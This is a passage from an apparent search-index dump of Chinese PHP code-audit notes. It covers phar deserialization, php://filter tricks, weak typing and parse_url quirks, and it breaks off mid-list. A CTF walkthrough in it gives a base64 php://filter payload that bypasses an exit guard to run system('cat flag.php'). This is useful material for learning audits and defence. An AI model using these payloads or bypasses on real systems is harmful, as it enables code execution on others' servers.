\u8bb0\u5f55\u4ee3\u7801\u5ba1\u8ba1\u7684\u5c0ftrick","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"audit/#_1","text":"\u8bb0\u5f55\u4ee3\u7801\u5ba1\u8ba1\u7684\u5c0ftrick","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"audit/audit5/","text":"\u5229\u7528 phar \u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762 \u00b6 phar\u6587\u4ef6\u7ed3\u6784 \u00b6 1. a stub \u00b6 \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \uff0c\u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u5426\u5219phar\u6269\u5c55\u5c06\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002 2. a manifest describing the contents \u00b6 phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5 \u5e8f\u5217\u5316 \u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002 3. the file contents \u00b6 \u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\u3002 4. [optional] a signature for verifying Phar integrity (phar file format only) \u00b6 \u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a demo \u00b6 \u8981\u5c06php.ini\u4e2d\u7684 phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3a Off \uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6\u3002 phar_gen.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> meta-data \u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\uff1a \u6709\u5e8f\u5217\u5316\u6570\u636e\u5fc5\u7136\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0cphp\u4e00\u5927\u90e8\u5206\u7684 \u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 \u5728\u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a \u53c2\u8003 \u00b6 paper","title":"\u5229\u7528`phar`\u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762"},{"location":"audit/audit5/#pharphp","text":"","title":"\u5229\u7528phar\u6269\u5c55PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u653b\u51fb\u9762"},{"location":"audit/audit5/#phar","text":"","title":"phar\u6587\u4ef6\u7ed3\u6784"},{"location":"audit/audit5/#1-a-stub","text":"\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u4e2a\u6807\u5fd7\uff0c\u683c\u5f0f\u4e3a xxx<?php xxx; __HALT_COMPILER();?> \uff0c\u524d\u9762\u5185\u5bb9\u4e0d\u9650\uff0c\u4f46\u5fc5\u987b\u4ee5 __HALT_COMPILER();?> \u6765\u7ed3\u5c3e\uff0c\u5426\u5219phar\u6269\u5c55\u5c06\u65e0\u6cd5\u8bc6\u522b\u8fd9\u4e2a\u6587\u4ef6\u4e3aphar\u6587\u4ef6\u3002","title":"1. a stub"},{"location":"audit/audit5/#2-a-manifest-describing-the-contents","text":"phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5 \u5e8f\u5217\u5316 \u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u4e0a\u8ff0\u653b\u51fb\u624b\u6cd5\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002","title":"2. a manifest describing the contents"},{"location":"audit/audit5/#3-the-file-contents","text":"\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\u3002","title":"3. the file contents"},{"location":"audit/audit5/#4-optional-a-signature-for-verifying-phar-integrity-phar-file-format-only","text":"\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a","title":"4. [optional] a signature for verifying Phar integrity (phar file format only)"},{"location":"audit/audit5/#demo","text":"\u8981\u5c06php.ini\u4e2d\u7684 phar.readonly \u9009\u9879\u8bbe\u7f6e\u4e3a Off \uff0c\u5426\u5219\u65e0\u6cd5\u751f\u6210phar\u6587\u4ef6\u3002 phar_gen.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php class TestObject { } @ unlink ( \"phar.phar\" ); $phar = new Phar ( \"phar.phar\" ); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar $phar -> startBuffering (); $phar -> setStub ( \"<?php __HALT_COMPILER(); ?>\" ); //\u8bbe\u7f6estub $o = new TestObject (); $phar -> setMetadata ( $o ); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest $phar -> addFromString ( \"test.txt\" , \"test\" ); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6 //\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97 $phar -> stopBuffering (); ?> meta-data \u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7684\uff1a \u6709\u5e8f\u5217\u5316\u6570\u636e\u5fc5\u7136\u4f1a\u6709\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0cphp\u4e00\u5927\u90e8\u5206\u7684 \u6587\u4ef6\u7cfb\u7edf\u51fd\u6570 \u5728\u901a\u8fc7 phar:// \u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\uff0c\u90fd\u4f1a\u5c06meta-data\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u6d4b\u8bd5\u540e\u53d7\u5f71\u54cd\u7684\u51fd\u6570\u5982\u4e0b\uff1a","title":"demo"},{"location":"audit/audit5/#_1","text":"paper","title":"\u53c2\u8003"},{"location":"audit/audit6/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6 \u00b6 php\u81ea\u8eab\u5728\u89e3\u6790\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u5982\u679c\u53c2\u6570\u540d\u5b57\u4e2d\u5305\u542b\u201d \u201c\u3001\u201d.\u201d\u3001\u201d[\u201c\u8fd9\u51e0\u4e2a\u5b57\u7b26\uff0c\u4f1a\u5c06\u4ed6\u4eec\u8f6c\u6362\u6210\u4e0b\u5212\u7ebf\u3002 \u00b6 \u4f2a\u534f\u8bae php://filter \u00b6 php://input \u548c php://output \u5206\u522b\u4ee3\u8868\u6807\u51c6\u8f93\u5165\u548c\u6807\u51c6\u8f93\u51fa\uff0c php://filter \u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002 \u6211\u4eec\u8fd9\u4e48\u6765\u7406\u89e3: 1 2 3 4 5 php > $fp = fopen('php://output', 'w'); php > var_dump($fp); resource(2) of type (stream) php > fwrite($fp, \"This is a test.\\n\"); This is a test. \u5f88\u660e\u663e\u6211\u4eec\u5411\u6807\u51c6\u8f93\u51fa\u4e2d\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u7684\u6b64\u65f6\u7684\u76ee\u7684\u662f\u5411\u6807\u51c6\u8f93\u51fa\u5199\u4e00\u53e5\u8bdd\u3002 \u5982\u679c\u8981\u8f6c\u6210\u5927\u5199\u5462\uff1f 1 2 3 php > stream_filter_append($fp, 'string.toupper'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. \u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u9700\u8981\u9644\u52a0\u4e00\u4e2a string.toupper \u8fc7\u6ee4\u5668\u5c31\u884c\uff0c\u4e8e\u662f\uff1a 1 2 3 php > $fp=fopen('php://filter/string.toupper/resource=php://output', 'w'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. php://filter/string.toupper/resource=php://output \u770b\u4e0a\u53bb\u5f88\u8d1f\u8d23 \u6211\u4eec\u8981\u5199\u5165\u7684\u76ee\u6807\u662f php://output \u8981\u52a0\u4e00\u4e2a\u8fc7\u6ee4\u5668 string.toupper \u5408\u5728\u4e00\u8d77\u5c31\u662f php://filter \u534f\u8bae ok\u5c31\u8fd9\u4e48\u7b80\u5355 \u770b\u4e00\u9053\u9898 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?> \u7b2c\u4e8c\u884c\u7684 <?php exit;?> \uff0c\u8fd9\u53e5\u8bdd\u5728\u5f00\u5934\u589e\u52a0\u4e86exit\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u5373\u4f7f\u6211\u4eec\u6210\u529f\u5199\u5165\u4e00\u53e5\u8bdd\uff0c\u4e5f\u6267\u884c\u4e0d\u4e86\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u5728\u5b9e\u6218\u4e2d\u5341\u5206\u5e38\u89c1\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u7f13\u5b58\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u7b49\u5730\u65b9\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u6587\u4ef6\uff0c\u90fd\u4f1a\u88ab\u52a0\u4e0a if(!defined(xxx))exit; \u4e4b\u7c7b\u7684\u9650\u5236\uff09\u3002 file_put_contents \u5141\u8bb8\u6211\u4eec\u5411\u4e00\u4e2a\u6587\u4ef6\u5199\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b\u8fc7\u6ee4\u7684\u4e1c\u4e1c\uff1f\u6bd4\u5982: base64 \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u5411 tmp.php \u5199\u5165\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u662fbase64\u4e4b\u540e\u7684\uff0c\u6211\u4eec\u53ea\u9700\u89e3\u7801base64\u5373\u53ef\uff0c\u800c\u8fd9\u65f6 <?php exit;?> \u5c31\u4f1a\u9762\u76ee\u5168\u975e\u4e86 $filename = php://filter/convert.base64-decode/resource=tmp.php \u56e0\u4e3a <?php exit;?> \u4e2d \"<\u3001?\u3001;\u3001>\" \u7b49\u7b26\u53f7\u89e3\u7801\u65f6\u90fd\u4f1a\u88ab\u5ffd\u7565\uff0c\u6240\u4ee5\u547d\u4ee4\u5c31\u53d8\u6210\u4e86\u2192 \u201cphpexit\u201d\u3002\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u7ed5\u8fc7\u4e86\u8fd9\u4e2a\u51fd\u6570\u3002\u4e4b\u540e\u6211\u4eec\u8981\u60f3\u6267\u884c\u6211\u4eec\u6240\u60f3\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u5728phpexit\u8fd9\u4e03\u4e2a\u5b57\u7b26\u540e\u4efb\u610f\u52a0\u4e00\u4e2a\u5b57\u6bcd\uff08\u56e0\u4e3abase64\u662f4\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u89e3\u7801\u7684 1 phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== --->\u4e3a\u4e86\u586b\u5145\u52a0\u4e00\u4e2aa \u535a\u5ba2\u56ed \u79bb\u522b\u6b4c \u4f2a\u534f\u8bae \u5b98\u65b9\u6587\u6863 \u5b98\u65b9\u6587\u6863","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/audit6/#_1","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/audit6/#php","text":"","title":"php\u81ea\u8eab\u5728\u89e3\u6790\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u5982\u679c\u53c2\u6570\u540d\u5b57\u4e2d\u5305\u542b\u201d \u201c\u3001\u201d.\u201d\u3001\u201d[\u201c\u8fd9\u51e0\u4e2a\u5b57\u7b26\uff0c\u4f1a\u5c06\u4ed6\u4eec\u8f6c\u6362\u6210\u4e0b\u5212\u7ebf\u3002"},{"location":"audit/audit6/#phpfilter","text":"php://input \u548c php://output \u5206\u522b\u4ee3\u8868\u6807\u51c6\u8f93\u5165\u548c\u6807\u51c6\u8f93\u51fa\uff0c php://filter \u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002 \u6211\u4eec\u8fd9\u4e48\u6765\u7406\u89e3: 1 2 3 4 5 php > $fp = fopen('php://output', 'w'); php > var_dump($fp); resource(2) of type (stream) php > fwrite($fp, \"This is a test.\\n\"); This is a test. \u5f88\u660e\u663e\u6211\u4eec\u5411\u6807\u51c6\u8f93\u51fa\u4e2d\u5199\u5165\u4e86\u4e00\u53e5\u8bdd\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u7684\u6b64\u65f6\u7684\u76ee\u7684\u662f\u5411\u6807\u51c6\u8f93\u51fa\u5199\u4e00\u53e5\u8bdd\u3002 \u5982\u679c\u8981\u8f6c\u6210\u5927\u5199\u5462\uff1f 1 2 3 php > stream_filter_append($fp, 'string.toupper'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. \u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u9700\u8981\u9644\u52a0\u4e00\u4e2a string.toupper \u8fc7\u6ee4\u5668\u5c31\u884c\uff0c\u4e8e\u662f\uff1a 1 2 3 php > $fp=fopen('php://filter/string.toupper/resource=php://output', 'w'); php > fwrite($fp, \"This is a test.\\n\"); THIS IS A TEST. php://filter/string.toupper/resource=php://output \u770b\u4e0a\u53bb\u5f88\u8d1f\u8d23 \u6211\u4eec\u8981\u5199\u5165\u7684\u76ee\u6807\u662f php://output \u8981\u52a0\u4e00\u4e2a\u8fc7\u6ee4\u5668 string.toupper \u5408\u5728\u4e00\u8d77\u5c31\u662f php://filter \u534f\u8bae ok\u5c31\u8fd9\u4e48\u7b80\u5355 \u770b\u4e00\u9053\u9898 1 2 3 4 5 6 7 8 9 10 11 12 <?php show_source ( __FILE__ ); $c = \"<?php exit;?>\" ; @ $c .= $_POST [ 'c' ]; @ $filename = $_POST [ 'file' ]; if ( ! isset ( $filename )) { file_put_contents ( 'tmp.php' , '' ); } @ file_put_contents ( $filename , $c ); include ( 'tmp.php' ); ?> \u7b2c\u4e8c\u884c\u7684 <?php exit;?> \uff0c\u8fd9\u53e5\u8bdd\u5728\u5f00\u5934\u589e\u52a0\u4e86exit\u8fc7\u7a0b\uff0c\u5bfc\u81f4\u5373\u4f7f\u6211\u4eec\u6210\u529f\u5199\u5165\u4e00\u53e5\u8bdd\uff0c\u4e5f\u6267\u884c\u4e0d\u4e86\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u5728\u5b9e\u6218\u4e2d\u5341\u5206\u5e38\u89c1\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u7f13\u5b58\u3001\u914d\u7f6e\u6587\u4ef6\u7b49\u7b49\u5730\u65b9\uff0c\u4e0d\u5141\u8bb8\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u6587\u4ef6\uff0c\u90fd\u4f1a\u88ab\u52a0\u4e0a if(!defined(xxx))exit; \u4e4b\u7c7b\u7684\u9650\u5236\uff09\u3002 file_put_contents \u5141\u8bb8\u6211\u4eec\u5411\u4e00\u4e2a\u6587\u4ef6\u5199\u5165\u4e00\u4e9b\u4e1c\u897f\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b\u8fc7\u6ee4\u7684\u4e1c\u4e1c\uff1f\u6bd4\u5982: base64 \u6240\u4ee5\u6211\u4eec\u5c31\u662f\u5411 tmp.php \u5199\u5165\u6570\u636e\uff0c\u4f46\u662f\u8fd9\u4e2a\u6570\u636e\u662fbase64\u4e4b\u540e\u7684\uff0c\u6211\u4eec\u53ea\u9700\u89e3\u7801base64\u5373\u53ef\uff0c\u800c\u8fd9\u65f6 <?php exit;?> \u5c31\u4f1a\u9762\u76ee\u5168\u975e\u4e86 $filename = php://filter/convert.base64-decode/resource=tmp.php \u56e0\u4e3a <?php exit;?> \u4e2d \"<\u3001?\u3001;\u3001>\" \u7b49\u7b26\u53f7\u89e3\u7801\u65f6\u90fd\u4f1a\u88ab\u5ffd\u7565\uff0c\u6240\u4ee5\u547d\u4ee4\u5c31\u53d8\u6210\u4e86\u2192 \u201cphpexit\u201d\u3002\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u7ed5\u8fc7\u4e86\u8fd9\u4e2a\u51fd\u6570\u3002\u4e4b\u540e\u6211\u4eec\u8981\u60f3\u6267\u884c\u6211\u4eec\u6240\u60f3\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u5728phpexit\u8fd9\u4e03\u4e2a\u5b57\u7b26\u540e\u4efb\u610f\u52a0\u4e00\u4e2a\u5b57\u6bcd\uff08\u56e0\u4e3abase64\u662f4\u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u89e3\u7801\u7684 1 phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== --->\u4e3a\u4e86\u586b\u5145\u52a0\u4e00\u4e2aa \u535a\u5ba2\u56ed \u79bb\u522b\u6b4c \u4f2a\u534f\u8bae \u5b98\u65b9\u6587\u6863 \u5b98\u65b9\u6587\u6863","title":"\u4f2a\u534f\u8baephp://filter"},{"location":"audit/audit7/","text":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6 \u00b6 \u7cfb\u7edf\u53d8\u91cf\uff08\u8d85\u5168\u5c40\u53d8\u91cf\uff09 \u00b6 1 2 3 4 5 6 7 8 9 $GLOBALS // \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf $_POST // \u83b7\u53d6 post \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_GET // \u83b7\u53d6 get \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_COOKIE // \u83b7\u53d6 cookie $_SESSION // \u83b7\u53d6 session $_FILES // \u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6 $_REQUEST // \u83b7\u53d6 $_GET\uff0c$_POST\uff0c$_COOKIE \u4e2d\u7684\u6570\u636e $_ENV // \u73af\u5883\u53d8\u91cf $_SERVER // \u670d\u52a1\u5668\u548c\u6267\u884c\u73af\u5883\u4fe1\u606f $ \u5bfc\u81f4\u7684\u53d8\u91cf\u8986\u76d6 \u00b6 1 2 3 4 5 6 7 $a=\"hello\"; // \u5b9a\u4e49\u53ef\u53d8\u53d8\u91cf\u65f6\uff0c\u53ef\u4ee5\u52a0\u4e0a\u5927\u62ec\u53f7 ${$a}=\"world\"; echo ${$a}; echo $$a; // \u5c06\u666e\u901a\u53d8\u91cf\u7684\u503c hello\uff0c\u4f5c\u4e3a\u53ef\u53d8\u53d8\u91cf\u7684\u53d8\u91cf\u540d\uff0c\u5373 $a echo $hello; \u53cc\u5f15\u53f7\u89e3\u6790\u53d8\u91cf\uff0c\u5355\u5f15\u53f7\u4e0d\u89e3\u6790\u53d8\u91cf \u00b6 1 2 3 $str='hello'; echo \"str is $str\"; // \u8fd0\u884c\u7ed3\u679c : str is hello echo 'str is $str'; // \u8fd0\u884c\u7ed3\u679c : str is $str \u672a\u5b9a\u4e49\u53d8\u91cf \u00b6 1 2 3 4 5 6 7 8 9 php > var_dump($a); PHP Notice: Undefined variable: a in php shell code on line 1 NULL php > var_dump($a==0); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump($a+1); PHP Notice: Undefined variable: a in php shell code on line 1 int(1) //\u4e8e\u662f\u53ef\u4ee5\u901a\u8fc7\u672a\u5b9a\u4e49\u53d8\u91cf\u6765\u83b7\u5f97\u6570\u503c \u6587\u4ef6\u64cd\u4f5c\u76f8\u5173 \u00b6 glob \u51fd\u6570 scandir \u51fd\u6570 $_GET \u548c $_POST \u4f20\u5165\u6570\u7ec4 \u00b6 \u5982\u679c GET \u53c2\u6570\u4e2d\u8bbe\u7f6e name[]=a \uff0c\u90a3\u4e48 $_GET['name'] = [a] \uff0cphp \u4f1a\u628a []=a \u5f53\u6210\u6570\u7ec4\u4f20\u5165\uff0c $_GET \u4f1a\u81ea\u52a8\u5bf9\u53c2\u6570\u8c03\u7528 urldecode \u3002 $_POST \u540c\u6837\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u6570\u636e\uff0c user[]=admin \uff0c $_POST['user'] \u5f97\u5230\u7684\u662f ['admin'] \u662f\u4e00\u4e2a\u6570\u7ec4\u3002 strcmp \u548c strcasecmp \u00b6 strcmp \u548c strcasecmp\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 \u7528\u4e8e\u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u503c\u5982\u4e0b\uff1a \u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b \u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 5.2 \u4e2d\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u5148\u8f6c\u6362\u6210string\u7c7b\u578b\u3002 5.3.3 \u4ee5\u540e\uff0c\u5f53\u6bd4\u8f83\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u662f0\u3002 5.5 \u4e2d\u5982\u679c\u53c2\u6570\u4e0d\u662fstring\u7c7b\u578b\uff0c\u76f4\u63a5return\u4e86 \u6570\u7ec4\u8ddf\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f1a\u8fd4\u56de NULL \u00b6 1 2 3 4 5 6 7 php > $array=[1, 2, 3]; php > var_dump(strcmp($array, 'abc')); PHP Warning: strcmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL //\u67d0\u79cd\u7a0b\u5ea6\u5c31\u662f0 php > var_dump(strcasecmp($array, 'abc')); PHP Warning: strcasecmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL parse_url \u00b6 parse_url() \u51fd\u6570\u53ef\u4ee5\u89e3\u6790 URL\uff0c\u8fd4\u56de\u5176\u7ec4\u6210\u90e8\u5206\uff0c\u6b64\u51fd\u6570\u5e76\u4e0d\u610f\u5473\u7740\u7ed9\u5b9a\u7684 URL \u662f\u5408\u6cd5\u7684\uff0c\u5b83\u53ea\u662f\u5c06\u4e0a\u65b9\u5217\u8868\u4e2d\u7684\u5404\u90e8\u5206\u5206\u5f00\u3002parse_url() \u53ef\u63a5\u53d7\u4e0d\u5b8c\u6574\u7684 URL\uff0c\u5e76\u5c3d\u91cf\u5c06\u5176\u89e3\u6790\u6b63\u786e\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff1a 1 2 3 4 5 6 7 8 php > $url = 'http://prontosil.club'; php > var_dump(parse_url($url)); array(2) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(14) \"prontosil.club\" } \u4f46\u662f\u5f53\u4e00\u4e2aurl\u6ca1\u6709\u534f\u8bae\u7684\u65f6\u5019\uff0c\u4f46\u662f\u7ed9\u4e00\u4e2a\u7aef\u53e3url\u7684\u5b57\u7b26\u4e32\u7684\u65f6\u5019parse_url\u5c31\u4f1a\u7206\u9519\u3002\u8fd9\u4e2a\u7ecf\u6d4b\u8bd5\u5728windows\u4e0b\u5e94\u8be5\u662fphp\u7248\u672c\u5168\u901a\u6740\u7684(5.2-7.0)\uff0clinux\u6ca1\u6d4b\u8bd5\u8fc7\u3002 1 2 3 php > $url = '/pupiles.com:80'; php > var_dump(parse_url($url)); bool(false) \u53ea\u8981\u7aef\u53e3\u540e\u9762\u8ddf\u5b57\u6bcd\u8fd8\u662f\u4f1a\u89e3\u6790\uff0c\u6bd4\u5982 1 2 3 4 5 6 php > $url = '/pupiles.com:80a'; php > var_dump(parse_url($url)); array(1) { [\"path\"]=> string(16) \"/pupiles.com:80a\" } \u7aef\u53e3\u89e3\u6790\u9519\u8bef \u00b6 1 2 3 4 5 6 7 8 9 // php5.5\u4ee5\u4e0a\u8fd9\u6837\u7684url\u7528parse_url\u89e3\u6790\u540e\u9884\u6d4b\u7684\u7ed3\u679c\u662f //pupiles.com/about:1234 array(2) { [\"host\"]=> string(11) \"pupiles.com\" [\"path\"]=> string(9) \"/about:1234\" } \u7136\u800c\u5b9e\u9645\u4e0a\uff1a 1 2 3 4 5 6 7 8 9 10 php > $url = 'pupiles.com/about:1234'; php > var_dump(parse_url($url)); array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } \u4f1a\u9ed8\u8ba4\u89e3\u6790\u51fa\u4e00\u4e2aportkey \u8def\u5f84\u89e3\u6790\u9519\u8bef \u00b6 1 2 3 4 5 6 7 8 php > print_r($uri); /upload?/home/binarycloud/ php > print_r(parse_url($uri)); Array ( [path] => /upload [query] => /home/binarycloud/ ) 1 2 3 4 5 6 7 php > $uri = \"//upload?/home/binarycloud/\"; php > print_r(parse_url($uri)); Array ( [host] => upload [query] => /home/binarycloud/ ) \u7aef\u53e3\u6ea2\u51fa \u00b6 \u5728php5.3.13\u7248\u672c\u4ee5\u4e0b\uff0c\u5f53\u8f93\u5165\u5982\u4e0burl 1 http://pupiles:78325 \u6309\u7167\u6b63\u5e38\u6765\u8bf4\u5e94\u8be5\u4f1a\u8fd4\u56defalse\uff0c\u4f46\u662f\u8fd9\u91cc\u4f1a\u8fd4\u56de 1 2 3 4 5 array(3) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(7) \"pupiles\" [\"port\"]=> int(12789) } php=5.5.38\u5982\u4e0b\uff1a 1 2 3 php > $uri = 'http://pupiles:78325'; php > var_dump(parse_url($uri)); bool(false) \u5f31\u7c7b\u578b \u00b6 \u5f53\u4e00\u4e2a\u6574\u5f62\u548c\u4e00\u4e2a\u5176\u4ed6\u7c7b\u578b\u884c\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u5176\u4ed6\u7c7b\u578b intval \u518d\u6bd4\u8f83 bool\u7c7b\u578b\u7684 true \u8ddf\u4efb\u610f\u5b57\u7b26\u4e32\u53ef\u4ee5\u5f31\u7c7b\u578b\u76f8\u7b49 1 2 3 4 5 6 7 8 9 10 11 1 == '1abc' // true true == 'abcd' // true \"42\" == \"42.0\" // true \"42\" == \"000042.00\" // true \"42\" == \"0x000000002A\" // true \"10\" == \"1e1\" // true \"42\" == \"0000000004.2E+1\" // true \"42\" == \"42.0e+000000\" // true [false] == [0] == [NULL] == [''] NULL == false == 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 '0.999999999999999999999' == 1 # true in PHP 4.3.0+ '0e0' == '0e1' '0e0' == '0E1' '10e2' == ' 01e3' '10e2' == '01e3' '10e2' == '1e3' '010e2' == '1e3' '010e2' == '01e3' '10' == '010' '10.0' == '10' '10' == '00000000010' '12345678' == 